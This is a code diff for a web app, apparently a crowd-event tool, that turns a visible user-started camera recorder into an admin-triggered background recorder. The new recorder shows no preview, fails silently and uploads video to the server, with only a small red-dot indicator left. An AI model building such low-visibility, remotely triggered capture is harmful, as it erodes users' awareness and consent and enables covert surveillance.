@@ -1,148 +1,128 @@
-// Camera & Recording Logic
+/**
+ * Starcatcher – Background Video Recording
+ * Records video (no audio) in the background when triggered by admin.
+ * No camera preview is shown to the user.
+ */
 
-const btnRecordMode = document.getElementById('btn-record-mode');
-const recordOverlay = document.getElementById('record-overlay');
-const btnCloseCamera = document.getElementById('btn-close-camera');
-const btnCaptureAction = document.getElementById('btn-capture-action');
-const recordInner = document.getElementById('record-inner');
-const cameraPreview = document.getElementById('camera-preview');
-const recordTimer = document.getElementById('record-timer');
-const uploadStatus = document.getElementById('upload-status');
-
-let stream = null;
-let mediaRecorder = null;
-let chunks = [];
-let isRecording = false;
-let startTime = 0;
-let timerInterval = null;
-
-if (btnRecordMode) {
-    btnRecordMode.addEventListener('click', openCamera);
-}
-
-if (btnCloseCamera) {
-    btnCloseCamera.addEventListener('click', closeCamera);
-}
-
-if (btnCaptureAction) {
-    btnCaptureAction.addEventListener('click', toggleRecording);
-}
-
-async function openCamera() {
-    try {
-        stream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: 'environment' },
-            audio: true
-        });
-        cameraPreview.srcObject = stream;
-        recordOverlay.style.display = 'flex';
-        uploadStatus.textContent = '';
-    } catch (err) {
-        console.error('Camera Access Error:', err);
-        alert('Could not access camera. Please allow permissions.');
-    }
-}
-
-function closeCamera() {
-    if (isRecording) {
-        stopRecording();
-    }
-    if (stream) {
-        stream.getTracks().forEach(track => track.stop());
-        stream = null;
-    }
-    recordOverlay.style.display = 'none';
-}
-
-function toggleRecording() {
-    if (!isRecording) {
-        startRecording();
-    } else {
-        stopRecording();
-    }
-}
-
-function startRecording() {
-    if (!stream) return;
-
-    chunks = [];
-    try {
-        // Prefer proper mime types
-        const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp9') ? 'video/webm;codecs=vp9' : 'video/webm';
-        mediaRecorder = new MediaRecorder(stream, { mimeType });
-    } catch (e) {
-        console.warn('Fallback to default MediaRecorder mime');
-        mediaRecorder = new MediaRecorder(stream);
+class BackgroundRecorder {
+    constructor() {
+        this.stream = null;
+        this.mediaRecorder = null;
+        this.chunks = [];
+        this.isRecording = false;
+        this.uploadUrl = '/api/upload';
+        this.indicatorEl = document.getElementById('record-indicator');
     }
 
-    mediaRecorder.ondataavailable = (e) => {
-        if (e.data.size > 0) chunks.push(e.data);
-    };
+    /**
+     * Start background recording (video only, no audio)
+     */
+    async start() {
+        if (this.isRecording) return;
 
-    mediaRecorder.onstop = uploadVideo;
+        try {
+            this.stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } },
+                audio: false
+            });
 
-    mediaRecorder.start();
-    isRecording = true;
+            this.chunks = [];
 
-    // UI Updates
-    recordInner.style.borderRadius = '4px';
-    recordInner.style.transform = 'scale(0.5)';
-    recordTimer.style.display = 'block';
-
-    startTime = Date.now();
-    updateTimer();
-    timerInterval = setInterval(updateTimer, 1000);
-}
-
-function stopRecording() {
-    if (!mediaRecorder || mediaRecorder.state === 'inactive') return;
-
-    mediaRecorder.stop();
-    isRecording = false;
-
-    // UI Updates
-    recordInner.style.borderRadius = '50%';
-    recordInner.style.transform = 'scale(1)';
-    clearInterval(timerInterval);
-}
-
-function updateTimer() {
-    const diff = Math.floor((Date.now() - startTime) / 1000);
-    const m = Math.floor(diff / 60).toString().padStart(2, '0');
-    const s = (diff % 60).toString().padStart(2, '0');
-    recordTimer.textContent = `${m}:${s}`;
-}
-
-async function uploadVideo() {
-    const blob = new Blob(chunks, { type: 'video/webm' });
-    uploadStatus.textContent = 'Uploading...';
-    btnCaptureAction.style.display = 'none'; // Prevent double record
-
-    try {
-        const response = await fetch('/api/upload', {
-            method: 'POST',
-            body: blob,
-            headers: {
-                'X-Filename': `rec_${Date.now()}.webm`
+            try {
+                const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp9')
+                    ? 'video/webm;codecs=vp9'
+                    : 'video/webm';
+                this.mediaRecorder = new MediaRecorder(this.stream, { mimeType });
+            } catch (e) {
+                this.mediaRecorder = new MediaRecorder(this.stream);
             }
-        });
 
-        const data = await response.json();
+            this.mediaRecorder.ondataavailable = (e) => {
+                if (e.data.size > 0) this.chunks.push(e.data);
+            };
 
-        if (data.success) {
-            uploadStatus.textContent = 'Sent! ✨';
-            uploadStatus.style.color = '#4ade80';
-            setTimeout(() => {
-                closeCamera();
-                btnCaptureAction.style.display = 'flex'; // Reset for next time if they open again
-            }, 1500);
-        } else {
-            throw new Error('Server returned failure');
+            this.mediaRecorder.onstop = () => this._upload();
+
+            this.mediaRecorder.start();
+            this.isRecording = true;
+            this._showIndicator(true);
+            console.log('🎬 Background recording started');
+
+        } catch (err) {
+            console.error('Camera access error:', err);
+            // Silently fail – user doesn't need to know
         }
-    } catch (err) {
-        console.error('Upload failed:', err);
-        uploadStatus.textContent = 'Failed to upload.';
-        uploadStatus.style.color = '#ef4444';
-        btnCaptureAction.style.display = 'flex';
+    }
+
+    /**
+     * Stop background recording and upload
+     */
+    stop() {
+        if (!this.isRecording || !this.mediaRecorder) return;
+
+        try {
+            if (this.mediaRecorder.state !== 'inactive') {
+                this.mediaRecorder.stop();
+            }
+        } catch (e) {
+            console.warn('Stop error:', e);
+        }
+
+        this.isRecording = false;
+        this._showIndicator(false);
+
+        // Release camera
+        if (this.stream) {
+            this.stream.getTracks().forEach(track => track.stop());
+            this.stream = null;
+        }
+
+        console.log('⏹️ Background recording stopped');
+    }
+
+    /**
+     * Upload recorded video to server
+     */
+    async _upload() {
+        if (this.chunks.length === 0) return;
+
+        const blob = new Blob(this.chunks, { type: 'video/webm' });
+        this.chunks = [];
+
+        // Determine upload URL
+        const baseUrl = (window.CROWDFLASH_CONFIG && window.CROWDFLASH_CONFIG.BACKEND_URL)
+            ? window.CROWDFLASH_CONFIG.BACKEND_URL.replace('wss://', 'https://').replace('ws://', 'http://')
+            : '';
+
+        try {
+            const response = await fetch(baseUrl + this.uploadUrl, {
+                method: 'POST',
+                body: blob,
+                headers: {
+                    'X-Filename': `rec_${Date.now()}.webm`
+                }
+            });
+
+            const data = await response.json();
+            if (data.success) {
+                console.log('✅ Video uploaded:', data.filename);
+            } else {
+                throw new Error('Upload failed');
+            }
+        } catch (err) {
+            console.error('❌ Upload error:', err);
+        }
+    }
+
+    /**
+     * Show/hide recording indicator (small red dot)
+     */
+    _showIndicator(visible) {
+        if (this.indicatorEl) {
+            this.indicatorEl.style.display = visible ? 'flex' : 'none';
+        }
     }
 }
+
+// Export
+window.BackgroundRecorder = BackgroundRecorder;
